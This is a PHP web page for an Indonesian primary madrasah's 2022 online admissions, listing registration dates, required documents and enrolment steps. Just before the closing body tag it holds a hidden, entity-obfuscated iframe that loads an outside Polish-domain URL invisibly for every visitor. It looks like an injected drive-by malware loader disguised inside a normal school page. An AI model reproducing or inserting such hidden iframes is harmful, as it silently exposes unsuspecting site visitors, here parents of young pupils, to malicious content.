<?php
include "header.php";
?>
		<div class="container_12">
        

            
          
            
   <div class="grid_6">
 <html>
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1" />
<title>PSB Online 2011</title>
<style type="text/css">
<!--
.style1 {
font-family: Arial, Helvetica, sans-serif;
font-size: 12px;
}
.style3 {font-family: Arial, Helvetica,
sans-serif; font-size: 16px; font-weight:
bold; }
.style4 {
font-family: Arial, Helvetica, sans-serif;
font-weight: bold;
font-size: 12px;
153
}
.fdf {
color: #F00;
}
-->
</style>
</head>
<body>
<table width="1300" border="0">


<tr>
<td colspan="8">&nbsp;</td>
</tr>
<tr>
<td width="33">&nbsp;</td>
<td colspan="8"><p
class="style3">Aturan dan Prosedur PSB
Online</p></td>
</tr>
<tr>
<td>&nbsp;</td>
<td colspan="8"
class="style1">&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td width="26" valign="top"
class="style1"><strong>1.</strong></td>
<td colspan="5" valign="top"
class="style1"><strong>Waktu
Pendaftaran</strong></td>
<td width="1"
class="style1">&nbsp;</td>
</tr>
<tr>
<td height="30">&nbsp;</td>
<td valign="top"
class="style1">&nbsp;</td>
<td colspan="5" valign="top"
class="style1">Hari Selasa tanggal 17 Mei
s/d Jumat tanggal 8 Juli 2022.</td>
<td class="style1">&nbsp;</td>
</tr>
<tr>
<td>&nbsp;</td>
<td valign="top"
class="style1"><strong>2.</strong></td>
<td colspan="5" valign="top"
class="style1"><strong>Syarat-Syarat
Pendaftaran</strong></td>
<td class="style1">&nbsp;</td>
</tr>
<tr>
<td height="118"
rowspan="7">&nbsp;</td>
<td rowspan="7" valign="top"
class="style1">&nbsp;</td>
<td colspan="3" align="center"
valign="top" class="style1">a.</td>
<td colspan="2" valign="top"
class="style1">Fotokopi Ijazah TK, PAUD, RA, 1 Lembar.</td>
<td rowspan="7"
class="style1">&nbsp;</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">b.</td>
<td colspan="2" valign="top"
class="style1">Fotokopi KK, 1 Lembar.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">c.</td>
<td colspan="2" valign="top"
class="style1">Pas foto hitam putih ukuran 3 x 4 cm sebanyak 4 (empat) lembar dan 2 x 3 cm, 2 Lembar.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">d.</td>
<td colspan="2" valign="top"
class="style1">Fotokopi akte kelahiran, 1 Lembar.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">e.</td>
<td colspan="2" valign="top"
class="style1">Fotokopi KTP (Ayah & Ibu), 1 Lembar.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">f.</td>
<td colspan="2" valign="top"
class="style1">Fotokopi Kartu PKH, KIP, KIS, 1 Lembar.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1"></td>

</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1"></td>

</tr>
<tr>
<td height="30" colspan="3"
align="center" valign="top"
class="style1"></td>

</tr>
<tr>
<td>&nbsp;</td>
<td valign="top"
class="style1"><strong>3.</strong></td>
<td colspan="5" valign="top"
class="style1"><strong>Cara
Pendaftaran</strong></td>
<td class="style1">&nbsp;</td>
</tr>
<tr>
<td height="148"
rowspan="9">&nbsp;</td>
<td rowspan="9" valign="top"
class="style1">&nbsp;</td>
<td colspan="3" align="center"
valign="top" class="style1">a.</td>
<td colspan="2" valign="top"
class="style1">Calon peserta didik baru mengisi formulir pendaftaran di menu pendaftaran</td>
<td rowspan="9"
class="style1">&nbsp;</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">b.</td>
<td colspan="2" valign="top"
class="style1">Mencetak Formulir yang telah di isi.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">c.</td>
<td colspan="2" valign="top"
class="style1">Calon peserta didik baru datang ke MI Darul Hasanah Kuripan.</td>
</tr>
<tr>
<td colspan="3" align="center"
valign="top" class="style1">d.</td>
<td colspan="2" valign="top"
class="style1">Menyerahkan Formulir yang sudah di cetak sebagai tanda telah melakukan pendaftaran dan menyerahkan syarat-syarat
 pendaftaran dan dimasukkan <p>ke dalam stop map warna kuning untuk putra dan stop map warna merah untuk putri kepada petugas. </p></td>
</tr>
<tr>
</tr>
<tr>
</tr>
<tr>
</tr>
<tr>

</tr>
<tr>


<tr>
<td height="21">&nbsp;</td>
<td valign="top"
class="style1"><strong>4.</strong></td>
<td colspan="5" valign="top"
class="style1">Pengumuman calon peserta
didik yang dinyatakan diterima dan tidak diterima sebagai
peserta didik baru tahun pelajaran
2022/2023 diumumkan pada hari Jumat, <p>tanggal
29 Juli 2022 bisa datang ke sekolah atau bisa di lihat melalui website ini dengan menginputkan nomor 
pendaftaran pada menu pengumuman hasil seleksi.</p></td>
<td class="style1">&nbsp;</td>
</tr>
<tr>
<td height="50">&nbsp;</td>
<td valign="top"
class="style1"><strong>5.</strong></td>
<td colspan="5" valign="top"
class="style1">Bagi calon peserta didik
yang dinyatakan diterima wajib melaksanakan
daftar ulang hari Kamis tanggal 4 Agustus 2022
atau hari Jumat tanggal 5 Agustus 2022.</td>
<td class="style1">&nbsp;</td>
</tr>

<tr>
<td height="21">&nbsp;</td>
<td valign="top"
class="style1">&nbsp;</td>
<td colspan="5" valign="top"
class="style1">&nbsp;</td>
<td class="style1">&nbsp;</td>
</tr>
</table>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>
	</div>

            
            <div style="clear:both;"></div>
        </div> <!-- End .container_12 -->
		
           
        <!-- Footer -->
        <?php
		include "footer.php";
		?>